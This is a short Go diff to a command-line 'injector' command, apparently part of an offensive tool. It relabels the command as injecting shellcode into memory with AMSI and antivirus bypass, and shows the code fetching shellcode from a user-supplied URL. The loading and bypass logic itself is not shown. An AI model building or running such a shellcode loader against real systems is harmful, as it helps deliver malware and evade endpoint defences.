@@ -25,13 +25,8 @@ var urlv string
 // injectorCmd represents the injector command
 var injectorCmd = &cobra.Command{
 	Use:   "injector",
-	Short: "A brief description of your command",
-	Long: `A longer description that spans multiple lines and likely contains examples
-and usage of using your command. For example:
-
-Cobra is a CLI library for Go that empowers applications.
-This application is a tool to generate the needed files
-to quickly create a Cobra application.`,
+	Short: "Inject your shellcode into memory",
+	Long:  `Inject your shellcode into memory with AMSI/AV bypass techniques`,
 	Run: func(cmd *cobra.Command, args []string) {
 		shellcode, err := ShellCodeInjector.GetShellCodeFromUrl(urlv)
 		ShellCodeInjector.HandleError(err)
